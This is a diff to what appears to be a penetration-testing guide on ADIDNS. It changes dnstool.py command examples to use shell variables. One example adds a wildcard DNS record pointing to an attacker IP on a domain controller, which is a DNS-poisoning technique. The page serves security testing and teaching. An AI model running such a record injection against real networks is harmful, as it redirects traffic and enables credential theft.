@@ -37,7 +37,7 @@ ADIDNS zones can be remotely edited
 The state of WINS forward lookup can be enumerated with [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (Python). The entry type 65281 (i.e. "WINS") will exist if WINS forward lookup is enabled.
 
 ```bash
-dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DomainController'
+dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" --record '@' --action 'query' "$DC_HOST"
 ```
 
 
@@ -62,10 +62,10 @@ An awesome Python alternative to Powermad's functions is [dnstool](https://githu
 
 ```bash
 # query a node
-dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController
+dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" --record '*' --action query "$DC_HOST"
 
 # add a node and attach a record
-dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
+dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" --record '*' --action add --data "$ATTACKER_IP" "$DC_HOST"
 ```
 
 
